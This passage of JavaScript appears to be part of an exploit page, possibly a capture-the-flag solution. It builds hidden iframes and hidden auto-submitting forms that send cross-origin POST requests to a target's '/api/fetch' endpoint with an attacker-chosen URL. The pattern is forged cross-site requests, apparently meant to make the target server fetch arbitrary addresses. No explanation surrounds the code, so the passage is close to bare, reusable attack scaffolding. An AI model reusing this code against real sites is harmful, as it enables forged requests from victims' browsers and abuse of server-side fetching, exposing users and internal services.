  try { document.getElementById("l").textContent += "\n" + m; } catch (e) {}

function post(url, name) {
  const iframe = document.createElement("iframe");
  iframe.name = name || ("f" + Math.random().toString(36).slice(2));
  iframe.style.display = "none";
  document.body.appendChild(iframe);
  const f = document.createElement("form");
  f.method = "POST"; f.action = T + "/api/fetch"; f.target = iframe.name;
  f.enctype = "application/x-www-form-urlencoded";
  const i = document.createElement("input");
  i.type = "hidden"; i.name = "url"; i.value = url;
  f.appendChild(i); document.body.appendChild(f); f.submit();
  return iframe;
}
function postWait(url, ms) {
  return new Promise(function(resolve) {
    const name = "f" + Math.random().toString(36).slice(2);
    const iframe = post(url, name);
    var done = false;
    function finish() { if (!done) { done = true; resolve(); } }
    iframe.onload = finish;
    setTimeout(finish, ms || 2500);
  });
}
